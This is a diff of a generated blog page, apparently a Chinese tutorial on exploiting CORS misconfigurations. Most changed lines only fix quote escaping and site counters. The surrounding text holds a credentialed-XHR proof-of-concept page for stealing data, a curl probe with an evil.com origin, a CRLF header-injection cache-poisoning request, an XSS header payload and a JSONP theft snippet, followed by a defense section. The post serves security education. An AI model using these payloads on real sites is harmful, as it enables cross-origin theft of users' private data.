@@ -85,7 +85,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygxgwtt7gj20s30cyab9.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygydi0d9hj20dp07776j.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyk0fm6t0oj20fe07p3yl.jpg">
-<meta property="og:updated_time" content="2019-12-04T08:30:45.873Z">
+<meta property="og:updated_time" content="2019-12-06T09:54:50.059Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="cors漏洞">
 <meta name="twitter:description" content="CORS处理跨域浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 只要同时满足以下两大条件，就属于简单请求。 （1) 请求方法是以下三种方法之一：  HEAD GET POST  （2）HTTP的头信息不超出以下几种字段：  Accept Accept-Language Content-Language Last-E">
@@ -335,7 +335,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-12-04 16:30:45" itemprop="dateModified" datetime="2019-12-04T16:30:45+08:00">2019-12-04</time>
+                <time title="修改时间：2019-12-06 17:54:50" itemprop="dateModified" datetime="2019-12-06T17:54:50+08:00">2019-12-06</time>
               </span>
             
           
@@ -357,7 +357,7 @@
               
                 <span class="post-meta-item-text">本文字数：</span>
               
-              <span title="本文字数">18k</span>
+              <span title="本文字数">19k</span>
             </span>
           
             <span class="post-meta-item">
@@ -506,7 +506,7 @@
 <li>Connection:      Keep-Alive</li>
 <li>Content-Type: text/plain</li>
 </ol>
-<p>上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示<a href="http://api.bob.com可以请求数据。**该字段也可以设为星号，表示同意任意跨源请求。" target="_blank" rel="noopener">http://api.bob.com可以请求数据。**该字段也可以设为星号，表示同意任意跨源请求。</a>**</p>
+<p>上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示 <a href="http://api.bob.com" target="_blank" rel="noopener">http://api.bob.com</a> 可以请求数据。<strong>该字段也可以设为星号，表示同意任意跨源请求。</strong></p>
 <ol>
 <li>Access-Control-Allow-Origin: *</li>
 </ol>
@@ -575,7 +575,7 @@
 <p>比如这个请求，它的跨域配置没有一点问题，它出错仅仅是因为request的Accept和response的Content-Type不匹配而已。</p>
 <p>更多</p>
 <p>基本上都是这样去分析一个ajax请求，通过Chrome就可以知道了发送了什么数据，收到了什么数据，然后再一一比对就知道问题何在了。</p>
-<h1 id="CORS漏洞利用"><a href="#CORS漏洞利用" class="headerlink" title="CORS漏洞利用"></a>CORS漏洞利用</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略SOP是应用程序安全性中的一个重要概念涉及大量的客户端脚本语言例如JavaScript。<br>SOP规则允许脚本运行在来自同一站点同一源的页面访问方法和其他脚本的属性没有特别限制的页面中同时阻止访问大多数方法和来自不同站点的页面之间的属性不同的来源。<br>这种机制对于现代Web应用程序尤其重要因为它们广泛依赖HTTP cookie保持经过身份验证的用户会话服务器决定是否向客户端发送基于会话cookie的客户信息的机密信息。<br>客户端例如浏览器必须保证来自无关网站来源的内容之间的严格分离以防止数据完整性和机密性的丢失。<br>术语“源”使用以下定义<br>-域名<br>-应用协议<br>-TCP端口<br>当且仅当前面三个值完全相同时才认为两个资源具有同源基础。<br>为了更好地解释该概念下表显示了关于URL ”<a href="http://www.example.com/dir/page.html" target="_blank" rel="noopener">http://www.example.com/dir/page.html</a>“ 的同源策略控制结果。</p>
+<h1 id="CORS漏洞利用"><a href="#CORS漏洞利用" class="headerlink" title="CORS漏洞利用"></a>CORS漏洞利用</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略SOP是应用程序安全性中的一个重要概念涉及大量的客户端脚本语言例如JavaScript。<br>SOP规则允许脚本运行在来自同一站点同一源的页面访问方法和其他脚本的属性没有特别限制的页面中同时阻止访问大多数方法和来自不同站点的页面之间的属性不同的来源。<br>这种机制对于现代Web应用程序尤其重要因为它们广泛依赖HTTP cookie保持经过身份验证的用户会话服务器决定是否向客户端发送基于会话cookie的客户信息的机密信息。<br>客户端例如浏览器必须保证来自无关网站来源的内容之间的严格分离以防止数据完整性和机密性的丢失。<br>术语&quot;源&quot;使用以下定义<br>-域名<br>-应用协议<br>-TCP端口<br>当且仅当前面三个值完全相同时才认为两个资源具有同源基础。<br>为了更好地解释该概念下表显示了关于URL &quot;<a href="http://www.example.com/dir/page.html" target="_blank" rel="noopener">http://www.example.com/dir/page.html</a>&quot; 的同源策略控制结果。</p>
 <p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtuf2mkmj20yq0dnjuc.jpg" alt></p>
 <h2 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h2><h3 id="cors与csrf"><a href="#cors与csrf" class="headerlink" title="cors与csrf"></a>cors与csrf</h3><p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygtz8pwk1j20w70bzjuc.jpg" alt></p>
 <p><strong>cors与csrf相同点：</strong></p>
@@ -616,7 +616,7 @@
 <h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><h4 id="①-利用某子域的xss绕过Referer的检查"><a href="#①-利用某子域的xss绕过Referer的检查" class="headerlink" title="① 利用某子域的xss绕过Referer的检查"></a>① 利用某子域的xss绕过Referer的检查</h4><p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygu9viqfej20li0bhq4e.jpg" alt></p>
 <p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygua10g3cj20z80d9q6v.jpg" alt></p>
 <p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygua5ly51j20xu0brmyp.jpg" alt></p>
-<h4 id="②null源"><a href="#②null源" class="headerlink" title="②null源"></a>②null源</h4><p>CORS的规范中还提到了“NULL”源。触发这个源是为了<strong>网页跳转或者是来自本地HTML文</strong>件。 目标应用可能会接收“null&quot;源，并且这个可能被测试者（或者攻击者）利用，<strong>任何网站很容易使用沙盒iframe来获取”null“源</strong></p>
+<h4 id="②null源"><a href="#②null源" class="headerlink" title="②null源"></a>②null源</h4><p>CORS的规范中还提到了&quot;NULL&quot;源。触发这个源是为了<strong>网页跳转或者是来自本地HTML文</strong>件。 目标应用可能会接收&quot;null&quot;源，并且这个可能被测试者（或者攻击者）利用，<strong>任何网站很容易使用沙盒iframe来获取&quot;null&quot;源</strong></p>
 <p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyguebob6vj20xb0jr7hy.jpg" alt></p>
 <p><strong>为什么服务器端会有这样的漏洞</strong></p>
 <ul>
@@ -628,7 +628,7 @@
 <ol>
 <li>CURL这个指令来测试这个网站</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://api.artsy.net -H “Origin: https://evil.com” -I</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://api.artsy.net -H &quot;Origin: https://evil.com&quot; -I</span><br></pre></td></tr></table></figure>
 
 <ol start="2">
 <li>返回结果</li>
@@ -658,7 +658,7 @@
 <p>python corser.py -poc GET</p>
 <p>python corser.py -poc POST</p>
 </blockquote>
-<p>使用此代码攻击者可以通过接收响应的“日志”处理程序从易受攻击的域名窃取数据。<br>当受害者在目标应用程序“vulnerability.domain”上进行身份验证时访问包含该页面的页面在前面的代码中浏览器将以下请求发送到“<strong>vulnerability.domain</strong>”</p>
+<p>使用此代码攻击者可以通过接收响应的&quot;日志&quot;处理程序从易受攻击的域名窃取数据。<br>当受害者在目标应用程序&quot;vulnerability.domain&quot;上进行身份验证时访问包含该页面的页面在前面的代码中浏览器将以下请求发送到&quot;<strong>vulnerability.domain</strong>&quot;</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html</span></span><br><span class="line"><span class="meta">&lt;html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">cors</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> params = <span class="string">'&#123;"appAccount":"","positionCode":"","cn":"","companyCode":"","state":"","pageNumber":1,"pageSize":15,"pageCode":"qx01"&#125;'</span>;</span></span><br><span class="line"><span class="javascript">                xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>)&#123;</span></span><br><span class="line"><span class="javascript">                                <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = alert(<span class="keyword">this</span>.responseText);</span></span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"><span class="javascript">                xhttp.open(<span class="string">"POST"</span>, <span class="string">"http://www.pxc.local/master/userAuth/list"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.setRequestHeader(<span class="string">'Content-type'</span>, <span class="string">'application/json;charset=UTF-8'</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.setRequestHeader(<span class="string">'X-Requested-With'</span>, <span class="string">'XMLHttpRequest'</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.setRequestHeader(<span class="string">'CSRF'</span>, <span class="string">'Token'</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.setRequestHeader(<span class="string">'Accept'</span>, <span class="string">''</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.setRequestHeader(<span class="string">'X-AUTH-TOKEN'</span>, <span class="string">'X-AUTH-TOKEN'</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.setRequestHeader(<span class="string">'X-AUTH-UID'</span>, <span class="string">'X-AUTH-UID'</span>);</span></span><br><span class="line"><span class="javascript">                xhttp.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">                xhttp.send(params);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>CORS POC<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Extract Information<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"cors()"</span>&gt;</span>Exploit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /api/private-data HTTP/1.1</span><br><span class="line">Host: vulnerable.domain</span><br><span class="line">Origin: https://attacker.domain/</span><br><span class="line">Cookie: JSESSIONID=&lt;redacted&gt;</span><br></pre></td></tr></table></figure>
@@ -666,35 +666,35 @@
 <p>应用程序响应如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: Apache-Coyote/<span class="number">1.1</span></span><br><span class="line">Access-Control-Allow-Origin: https:<span class="comment">//attacker.domain</span></span><br><span class="line">Access-Control-Allow-Credentials: <span class="keyword">true</span></span><br><span class="line">Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials</span><br><span class="line">Vary: Origin</span><br><span class="line">Expires: Thu, <span class="number">01</span> Jan <span class="number">1970</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span> GMT</span><br><span class="line">Last-Modified: Wed, <span class="number">02</span> May <span class="number">2018</span> <span class="number">09</span>:<span class="number">07</span>:<span class="number">07</span> GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, max-age=<span class="number">0</span>, post-check=<span class="number">0</span>, pre-check=<span class="number">0</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Type: application/json;charset=ISO<span class="number">-8859</span><span class="number">-1</span></span><br><span class="line">Date: Wed, <span class="number">02</span> May <span class="number">2018</span> <span class="number">09</span>:<span class="number">07</span>:<span class="number">07</span> GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">149</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"id"</span>:<span class="number">1234567</span>,<span class="string">"name"</span>:<span class="string">"Name"</span>,<span class="string">"surname"</span>:<span class="string">"Surname"</span>,<span class="string">"email"</span>:<span class="string">"email@target.local"</span>,<span class="string">"account"</span>:<span class="string">"ACT1234567"</span>,<span class="string">"balance"</span>:<span class="string">"123456,7"</span>,<span class="string">"token"</span>:<span class="string">"to</span></span><br><span class="line"><span class="string">p-secret-string"</span>&#125;</span><br></pre></td></tr></table></figure>
 
-<p>由于服务器发送了两个“<code>Access-Control-Allow-*</code>”标头受害者的浏览器允许使用JavaScript<br>代码包含在恶意页面中以访问私有数据。</p>
+<p>由于服务器发送了两个&quot;<code>Access-Control-Allow-*</code>&quot;标头受害者的浏览器允许使用JavaScript<br>代码包含在恶意页面中以访问私有数据。</p>
 <p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fygxgwtt7gj20s30cyab9.jpg" alt></p>
 <h4 id="④服务器端高速缓存投毒"><a href="#④服务器端高速缓存投毒" class="headerlink" title="④服务器端高速缓存投毒"></a>④服务器端高速缓存投毒</h4><p>另一种潜在的攻击利用CORS错误配置来注入任意HTTP头这可能会保存在服务器端缓存中例如创建存储的XSS。<br>利用此攻击的先决条件如下</p>
 <ul>
 <li><p>存在服务器端缓存</p>
 </li>
-<li><p>反射“Origin”标头</p>
+<li><p>反射&quot;Origin&quot;标头</p>
 </li>
-<li><p>在“Origin”标头内没有检查“\ r”之类的非法字符</p>
-<p>根据前面的先决条件James Kettle展示了利用HTTP头注入的针对IE / Edge受害者的漏洞的可能性。因为他们使用“<strong>\ r \ n”0x0d</strong>作为有效的HTTP标头终结符。</p>
+<li><p>在&quot;Origin&quot;标头内没有检查&quot;\ r&quot;之类的非法字符</p>
+<p>根据前面的先决条件James Kettle展示了利用HTTP头注入的针对IE / Edge受害者的漏洞的可能性。因为他们使用&quot;<strong>\ r \ n&quot;0x0d</strong>作为有效的HTTP标头终结符。</p>
 <p>请求</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Origin: z[0x0d]Content-Type: text/html; charset=UTF-7</span><br></pre></td></tr></table></figure>
 
 <p>IE解析的响应</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: z</span><br><span class="line">Content-Type: text/html; charset=UTF-7</span><br></pre></td></tr></table></figure>
 
-<p>前面的请求不能直接利用因为攻击者无法让受害者成为受害者浏览器发送前面的格式错误的标头。<br>如果攻击者使用格式错误的“Origin”标头发送前一个请求例如使用代理或命令行然后服务器可以缓存响应并将其提供给其他人。<br>在前面的示例中有效负载将页面的字符集更改为“UTF-7”众所周知这是对创建XSS漏洞很有用。</p>
+<p>前面的请求不能直接利用因为攻击者无法让受害者成为受害者浏览器发送前面的格式错误的标头。<br>如果攻击者使用格式错误的&quot;Origin&quot;标头发送前一个请求例如使用代理或命令行然后服务器可以缓存响应并将其提供给其他人。<br>在前面的示例中有效负载将页面的字符集更改为&quot;UTF-7&quot;众所周知这是对创建XSS漏洞很有用。</p>
 </li>
 </ul>
-<h4 id="⑤客户端高速缓存中毒"><a href="#⑤客户端高速缓存中毒" class="headerlink" title="⑤客户端高速缓存中毒"></a>⑤客户端高速缓存中毒</h4><p>此配置还可能允许攻击者利用其他可能不存在的漏洞利用。<br>例如考虑一个在响应内部反映“<code>X-User</code>”自定义内容的应用程序标题不对其进行任何输入验证也不进行输出编码。<br>请求</p>
+<h4 id="⑤客户端高速缓存中毒"><a href="#⑤客户端高速缓存中毒" class="headerlink" title="⑤客户端高速缓存中毒"></a>⑤客户端高速缓存中毒</h4><p>此配置还可能允许攻击者利用其他可能不存在的漏洞利用。<br>例如考虑一个在响应内部反映&quot;<code>X-User</code>&quot;自定义内容的应用程序标题不对其进行任何输入验证也不进行输出编码。<br>请求</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /login HTTP/1.1</span><br><span class="line">Host: www.target.local</span><br><span class="line">Origin: https://attacker.domain/</span><br><span class="line">X-User: &lt;svg/onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
 
-<p>响应请注意“<code>Access-Control-Allow-Origin</code>”已设置但“<code>Access-Control-Allow-Credentialstrue</code>”和“<code>VaryOrigin</code>”不存在</p>
+<p>响应请注意&quot;<code>Access-Control-Allow-Origin</code>&quot;已设置但&quot;<code>Access-Control-Allow-Credentialstrue</code>&quot;和&quot;<code>VaryOrigin</code>&quot;不存在</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: https://attacker.domain/</span><br><span class="line">…</span><br><span class="line">Content-Type: text/html</span><br><span class="line">…</span><br><span class="line"></span><br><span class="line">Invalid user: &lt;svg/onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
 
 <p>攻击者可以利用此XSS在受控服务器上上载<strong>以下JavaScript代码</strong>然后诱使受害者在其上导航</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var req = new XMLHttpRequest();</span><br><span class="line">req.onload = reqListener;</span><br><span class="line">req.open('get','http://www.target.local/login',true);</span><br><span class="line">req.setRequestHeader('X-User', '<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span>');</span><br><span class="line">req.send();</span><br><span class="line">function reqListener() &#123;</span><br><span class="line"> location='http://www.target.local/login';</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>如果未在响应中设置“<code>VaryOrigin</code>”标头如前面的示例所示受害者的浏览器可以将响应存储在缓存中基于浏览器行为然后直接显示它。<br>当浏览器导航到相关的URL时这可以通过重定向立即完成如在“<code>reqListener</code>”方法中显示。</p>
+<p>如果未在响应中设置&quot;<code>VaryOrigin</code>&quot;标头如前面的示例所示受害者的浏览器可以将响应存储在缓存中基于浏览器行为然后直接显示它。<br>当浏览器导航到相关的URL时这可以通过重定向立即完成如在&quot;<code>reqListener</code>&quot;方法中显示。</p>
 <h4 id="⑥jsonp跨域"><a href="#⑥jsonp跨域" class="headerlink" title="⑥jsonp跨域"></a>⑥jsonp跨域</h4><p>poc</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 引用一段如上请求为JS --&gt;</span><br><span class="line">&lt;script&gt;<span class="function"><span class="keyword">function</span> <span class="title">jsonp2</span>(<span class="params">data</span>)</span>&#123;alert(<span class="built_in">JSON</span>.stringify(data));&#125;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src="http:/</span><span class="regexp">/gh0st.cn/u</span>ser/center?callback=jsonp2<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -703,18 +703,18 @@
 <h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ol>
 <li>目标存在可控的子域名</li>
 </ol>
-<p>现在假设目标应用程序实现以下正则表达式以验证“<code>Origin</code>”标头</p>
+<p>现在假设目标应用程序实现以下正则表达式以验证&quot;<code>Origin</code>&quot;标头</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^https?:\/\/(.*\.)?target\.local$</span><br></pre></td></tr></table></figure>
 
-<p>它允许从“<code>target.local</code>”和任何子域来自HTTP或HTTPS协议进行跨域访问。<br>在此如果攻击者能够控制目标的有效子域例如“<code>subdomain.target.local</code>”<br>利用子域名接管的示例或者如果存在XSS漏洞攻击者可以使用它生成有效的CORS请求。</p>
+<p>它允许从&quot;<code>target.local</code>&quot;和任何子域来自HTTP或HTTPS协议进行跨域访问。<br>在此如果攻击者能够控制目标的有效子域例如&quot;<code>subdomain.target.local</code>&quot;<br>利用子域名接管的示例或者如果存在XSS漏洞攻击者可以使用它生成有效的CORS请求。</p>
 <ol start="2">
 <li>第三方域名</li>
 </ol>
 <p>有时必须允许第三方域名发出请求。如果攻击者能够在这些域名上上传JavaScript脚本他们可以进行攻击。<br>Amazon S3存储服务有时允许这种情况发生。 如果是目标应用程序使用Amazon服务时可能允许S3存储服务发出请求。<br>在这种情况下攻击者可以在受控的S3存储服务器上托管恶意页面。</p>
 <h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
-<li><p>1.不要配置“Access-Control-Allow-Origin”为通配符“*”，而且更重要的是，要严格效验来自请求数据包中的“Origin”的值。 当收到跨域请求的时候，要检查“Origin”的值是否是一个可信的源，还要检查是否为null</p>
+<li><p>1.不要配置&quot;Access-Control-Allow-Origin&quot;为通配符&quot;*&quot;，而且更重要的是，要严格效验来自请求数据包中的&quot;Origin&quot;的值。 当收到跨域请求的时候，要检查&quot;Origin&quot;的值是否是一个可信的源，还要检查是否为null</p>
 </li>
-<li><p>2.避免使用“Access-Control-Allow-Credentials: true”</p>
+<li><p>2.避免使用&quot;Access-Control-Allow-Credentials: true&quot;</p>
 </li>
 <li><p>3.减少Access-Control-Allow-Methods所允许的方法</p>
 </li>
@@ -843,8 +843,25 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-count">124</span>
           <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
         </a>
       </div>
     
@@ -976,7 +993,9 @@
         
           
         
-        <span class="site-state-item-count">59</span>
+          
+        
+        <span class="site-state-item-count">60</span>
         <span class="site-state-item-name">标签</span>
         </a>
       </div>
@@ -1087,12 +1106,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">1.4m</span>
+    <span title="站点总字数">1.5m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">21:52</span>
+    <span title="站点阅读时长">22:21</span>
 </div>
 
 <div>
